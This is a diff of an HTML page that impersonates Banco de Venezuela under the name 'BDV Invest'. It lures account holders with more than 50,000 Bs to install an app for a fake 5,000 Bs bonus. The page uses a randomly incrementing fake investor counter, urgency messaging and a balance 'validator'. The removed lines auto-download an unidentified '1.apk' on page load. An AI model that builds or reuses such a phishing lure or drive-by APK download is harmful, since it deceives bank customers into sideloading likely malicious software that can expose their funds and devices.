@@ -1,20 +1,275 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDV Inversión Plus - Bono Bs. 5.000</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f1f5f9;
+        }
+        .brand-gradient {
+            background: linear-gradient(135deg, #0284c7 0%, #4f46e5 50%, #db2777 100%);
+        }
+        .text-gradient {
+            background: linear-gradient(135deg, #0284c7, #db2777);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .neo-card {
+            background: #ffffff;
+            border: 1px solid rgba(226, 232, 240, 0.8);
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-start text-slate-800 pb-24">
+
+    <!-- 手机端居中模拟容器 -->
+    <div class="w-full max-w-md mx-auto flex flex-col min-h-screen bg-slate-50 relative shadow-2xl overflow-hidden">
+
+        <!-- 顶部通栏导航 (Sticky Header) -->
+        <header class="flex items-center justify-between px-5 py-4 bg-white/90 backdrop-blur-md border-b border-slate-100 sticky top-0 z-40">
+            <div class="flex items-center space-x-2.5">
+                <!-- 三色几何 Logo (复刻用户提供的黄、蓝、粉几何块) -->
+                <div class="w-9 h-9 flex items-center justify-center relative bg-slate-100 rounded-xl p-1 shadow-inner">
+                    <svg viewBox="0 0 100 100" class="w-full h-full">
+                        <!-- 黄色多边形 -->
+                        <polygon points="12,25 44,15 34,82 12,65" fill="#facc15" />
+                        <!-- 蓝色多边形 -->
+                        <polygon points="42,32 58,22 48,88 37,85" fill="#0284c7" />
+                        <!-- 品红色多边形 -->
+                        <polygon points="51,26 88,18 78,72 54,62" fill="#db2777" />
+                    </svg>
+                </div>
+                <div>
+                    <h1 class="font-extrabold text-base tracking-tight text-slate-900 leading-none">BDV <span class="text-sky-600">Invest</span></h1>
+                    <span class="text-[10px] font-semibold text-emerald-600 bg-emerald-50 px-1.5 py-0.5 rounded-full inline-block mt-0.5">Banco de Venezuela</span>
+                </div>
+            </div>
+            <div class="flex items-center gap-1 bg-amber-50 border border-amber-200 px-2.5 py-1 rounded-full">
+                <span class="text-xs">⚡</span>
+                <span class="text-[11px] font-bold text-amber-700">Bono Activo</span>
+            </div>
+        </header>
+
+        <!-- Hero 区域 -->
+        <section class="px-5 pt-6 pb-4 text-center relative overflow-hidden">
+            <!-- 柔和背景光晕 -->
+            <div class="absolute top-0 left-1/2 -translate-x-1/2 w-64 h-64 bg-sky-400/10 rounded-full blur-3xl pointer-events-none"></div>
+
+            <span class="inline-flex items-center gap-1.5 bg-sky-50 text-sky-700 text-xs font-bold uppercase tracking-wider px-3.5 py-1 rounded-full mb-3 border border-sky-200/60 shadow-sm">
+                <span>🇻🇪</span> Exclusivo Cuentas BDV (Bs. 50k+)
+            </span>
+
+            <h2 class="text-2xl sm:text-3xl font-extrabold text-slate-900 tracking-tight leading-snug mb-3">
+                Multiplica tus fondos con la nueva <span class="text-gradient">App de Inversión</span>
+            </h2>
+
+            <p class="text-slate-600 text-xs sm:text-sm leading-relaxed mb-5 px-1">
+                ¿Posees más de <strong class="text-slate-900 font-bold">50.000 Bs</strong> en tu cuenta del Banco de Venezuela? Desbloquea hoy rendimientos automáticos y recibe recompensa inmediata.
+            </p>
+
+            <!-- 核心奖励卡片 (Neo-banking style) -->
+            <div class="neo-card rounded-2xl p-5 relative overflow-hidden text-left border-l-4 border-l-pink-600 shadow-lg">
+                <div class="absolute right-3 top-3 w-16 h-16 bg-pink-50 rounded-full flex items-center justify-center text-2xl">
+                    🎁
+                </div>
+                <span class="text-[11px] font-bold uppercase tracking-wider text-slate-400 block mb-1">Recompensa de Bienvenida</span>
+                <div class="text-3xl font-black text-slate-900 mb-1">+Bs. 5.000 <span class="text-xs font-semibold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded align-middle">Instantáneo</span></div>
+                <p class="text-xs text-slate-500 leading-relaxed">Acreditado automáticamente tras instalar la nueva app y validar tu saldo superior a Bs. 50.000.</p>
+            </div>
+        </section>
+
+        <!-- 实时社会证明计数器 (Social Proof Counter) -->
+        <section class="px-5 mb-5">
+            <div class="bg-gradient-to-r from-sky-500 via-indigo-600 to-pink-600 p-[1px] rounded-2xl shadow-md">
+                <div class="bg-white rounded-[15px] p-3.5 flex items-center justify-between">
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-sky-50 text-sky-600 flex items-center justify-center font-bold text-lg">
+                            👥
+                        </div>
+                        <div>
+                            <div class="text-xs text-slate-500 font-medium">Inversionistas BDV hoy</div>
+                            <div class="text-base font-extrabold text-slate-900" id="investorCount">1,428 activos</div>
+                        </div>
+                    </div>
+                    <span class="flex h-3 w-3 relative">
+                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                      <span class="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
+                    </span>
+                </div>
+            </div>
+        </section>
+
+        <!-- 互动式资格校验模块 (Interactive Balance Checker) -->
+        <section class="px-5 mb-6">
+            <div class="neo-card rounded-2xl p-5">
+                <div class="flex items-center justify-between mb-3">
+                    <h3 class="text-sm font-extrabold text-slate-900 flex items-center gap-2">
+                        <span class="w-6 h-6 rounded-lg bg-sky-100 text-sky-600 flex items-center justify-center text-xs">🔍</span>
+                        Validador de Balance BDV
+                    </h3>
+                    <span class="text-[10px] bg-slate-100 text-slate-600 font-semibold px-2 py-0.5 rounded">Mín: 50.000 Bs</span>
+                </div>
+                <p class="text-xs text-slate-500 mb-4">Ingresa tu saldo actual estimado para comprobar si calificas al bono de Bs. 5.000:</p>
+
+                <div class="space-y-3">
+                    <div>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 font-bold text-sm">Bs.</span>
+                            <input type="number" id="userBalance" placeholder="Ej. 65000" class="w-full bg-slate-50 border border-slate-200 rounded-xl pl-11 pr-4 py-3 text-slate-900 font-bold text-sm focus:outline-none focus:border-sky-500 focus:bg-white transition" />
+                        </div>
+                    </div>
+                    <button onclick="checkEligibility()" class="w-full brand-gradient text-white font-bold py-3 px-4 rounded-xl text-sm shadow-md shadow-sky-500/20 active:scale-95 transition flex items-center justify-center gap-2">
+                        <span>Verificar Elegibilidad Ahora</span>
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+                    </button>
+                </div>
+
+                <!-- 校验结果反馈区 -->
+                <div id="checkResult" class="hidden mt-4 p-4 rounded-xl text-xs transition-all duration-300"></div>
+            </div>
+        </section>
+
+        <!-- 步骤指南 (Step-by-Step Guide) -->
+        <section class="px-5 mb-6">
+            <h3 class="text-sm font-extrabold text-slate-900 mb-3 flex items-center gap-2">
+                <span class="w-6 h-6 rounded-lg bg-pink-100 text-pink-600 flex items-center justify-center text-xs">📌</span>
+                Pasos para reclamar tu beneficio
+            </h3>
+            <div class="space-y-2.5">
+                <div class="neo-card p-3.5 rounded-xl flex items-start gap-3">
+                    <div class="w-7 h-7 rounded-lg bg-sky-500 text-white font-bold text-xs flex items-center justify-center shrink-0">1</div>
+                    <div>
+                        <h4 class="text-xs font-bold text-slate-900">Confirma tus fondos BDV</h4>
+                        <p class="text-[11px] text-slate-500 mt-0.5">Verifica poseer más de 50.000 Bs en tu cuenta principal.</p>
+                    </div>
+                </div>
+                <div class="neo-card p-3.5 rounded-xl flex items-start gap-3">
+                    <div class="w-7 h-7 rounded-lg bg-indigo-600 text-white font-bold text-xs flex items-center justify-center shrink-0">2</div>
+                    <div>
+                        <h4 class="text-xs font-bold text-slate-900">Descarga la nueva App</h4>
+                        <p class="text-[11px] text-slate-500 mt-0.5">Instala el paquete oficial de inversión optimizado para Venezuela.</p>
+                    </div>
+                </div>
+                <div class="neo-card p-3.5 rounded-xl flex items-start gap-3">
+                    <div class="w-7 h-7 rounded-lg bg-pink-600 text-white font-bold text-xs flex items-center justify-center shrink-0">3</div>
+                    <div>
+                        <h4 class="text-xs font-bold text-slate-900">Obtén Bs. 5.000 y rentabiliza</h4>
+                        <p class="text-[11px] text-slate-500 mt-0.5">El bono se acreditará en segundos al validar tu cuenta.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 底部主行动区 (Bottom CTA inside flow) -->
+        <section class="px-5 mb-8">
+            <div class="neo-card bg-gradient-to-br from-slate-900 to-slate-800 text-white rounded-2xl p-5 text-center relative overflow-hidden shadow-xl">
+                <div class="absolute -right-10 -bottom-10 w-32 h-32 bg-sky-500/20 rounded-full blur-2xl"></div>
+                <h3 class="text-base font-extrabold mb-1 text-white">Cupos Limitados por Campaña</h3>
+                <p class="text-[11px] text-slate-300 mb-4">Asegura tu bono de bienvenida de Bs. 5.000 hoy mismo.</p>
+                <button onclick="triggerDownload()" class="w-full bg-gradient-to-r from-emerald-400 to-teal-500 hover:from-emerald-300 hover:to-teal-400 text-slate-950 font-extrabold py-3.5 px-4 rounded-xl text-sm shadow-lg shadow-emerald-500/20 transition flex items-center justify-center gap-2">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
+                    Descargar App & Reclamar Bs. 5.000
+                </button>
+            </div>
+        </section>
+
+        <!-- 页脚备案信息 -->
+        <footer class="px-5 pb-16 text-center text-slate-400 text-[11px] space-y-2 border-t border-slate-200 pt-5">
+            <p>© 2026 BDV Invest. Todos los derechos reservados.</p>
+            <p class="text-[10px] text-slate-400">Plataforma financiera independiente para usuarios del Banco de Venezuela.</p>
+        </footer>
+
+        <!-- 底部悬浮吸顶下载栏 (Sticky Bottom Action Bar for Mobile) -->
+        <div class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-slate-200 p-3.5 z-50 max-w-md mx-auto flex items-center gap-3 shadow-lg">
+            <div class="flex-1">
+                <div class="text-[10px] font-bold text-slate-400 uppercase tracking-wider">Bono Exclusivo</div>
+                <div class="text-sm font-extrabold text-slate-900">+Bs. 5.000 <span class="text-[10px] text-emerald-600 font-medium">Gratis</span></div>
+            </div>
+            <button onclick="triggerDownload()" class="brand-gradient text-white font-bold px-5 py-2.5 rounded-xl text-xs shadow-md active:scale-95 transition flex items-center gap-1.5 shrink-0">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
+                Instalar App
+            </button>
+        </div>
+
+    </div>
+
+    <!-- 自定义通知弹窗 (替代 alert) -->
+    <div id="customModal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl border border-slate-100">
+            <div id="modalEmoji" class="text-4xl mb-3">🎉</div>
+            <h4 id="modalTitle" class="text-base font-extrabold text-slate-900 mb-1.5">¡Título!</h4>
+            <p id="modalDesc" class="text-xs text-slate-600 mb-5 leading-relaxed">Descripción...</p>
+            <button onclick="closeModal()" class="w-full brand-gradient text-white font-bold py-2.5 rounded-xl text-xs transition shadow-md">
+                Entendido
+            </button>
+        </div>
+    </div>
+
+    <!-- JavaScript 交互与动态逻辑 -->
     <script>
-        window.onload = function () {
-            const a = document.createElement('a');
-            a.href = './1.apk';
-            a.download = '1.apk';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+        // 动态增长社会证明计数器
+        let baseCount = 1428;
+        setInterval(() => {
+            baseCount += Math.floor(Math.random() * 3);
+            const counterEl = document.getElementById('investorCount');
+            if (counterEl) {
+                counterEl.innerText = baseCount.toLocaleString() + " activos";
+            }
+        }, 4000);
+
+        // 资格校验逻辑
+        function checkEligibility() {
+            const inputVal = document.getElementById('userBalance').value;
+            const resultBox = document.getElementById('checkResult');
+
+            if (!inputVal || isNaN(inputVal)) {
+                showModal("Atención", "Por favor, ingresa un monto válido en Bolívares (Bs) para verificar tu cuenta.", "⚠️");
+                return;
+            }
+
+            const balance = parseFloat(inputVal);
+            const threshold = 50000;
+
+            resultBox.classList.remove('hidden');
+
+            if (balance >= threshold) {
+                resultBox.className = "mt-4 p-4 rounded-xl text-xs bg-emerald-50 border border-emerald-200 text-emerald-800";
+                resultBox.innerHTML = `
+                    <div class="font-extrabold mb-1 flex items-center gap-1.5 text-emerald-900"><span>✅</span> ¡Felicidades! Eres elegible.</div>
+                    <p class="leading-relaxed text-emerald-700">Tu saldo de <strong>${balance.toLocaleString()} Bs</strong> cumple con el requisito mínimo (50.000 Bs). Ya puedes descargar la app y reclamar tus <strong>5.000 Bs</strong> de bono.</p>
+                `;
+            } else {
+                resultBox.className = "mt-4 p-4 rounded-xl text-xs bg-rose-50 border border-rose-200 text-rose-800";
+                resultBox.innerHTML = `
+                    <div class="font-extrabold mb-1 flex items-center gap-1.5 text-rose-900"><span>❌</span> Saldo por debajo del mínimo</div>
+                    <p class="leading-relaxed text-rose-700">El requisito es poseer al menos <strong>50.000 Bs</strong>. Tu saldo ingresado es ${balance.toLocaleString()} Bs. Te invitamos a completar tus fondos en el BDV para participar.</p>
+                `;
+            }
+        }
+
+        // 下载触发动作
+        function triggerDownload() {
+            showModal("Descarga Segura Iniciada", "Redirigiendo al paquete oficial de la App de Inversión BDV. Asegúrate de instalar y verificar tu cuenta para recibir tus 5.000 Bs.", "📥");
+        }
+
+        // 自定义模态框控制
+        function showModal(title, desc, emoji) {
+            document.getElementById('modalTitle').innerText = title;
+            document.getElementById('modalDesc').innerText = desc;
+            document.getElementById('modalEmoji').innerText = emoji;
+            document.getElementById('customModal').classList.remove('hidden');
+        }
+
+        function closeModal() {
+            document.getElementById('customModal').classList.add('hidden');
         }
     </script>
-</head>
-<body>
-    <p>Download failed? <a href="./1.apk" download="1.apk">Click here</a></p>
 </body>
 </html>
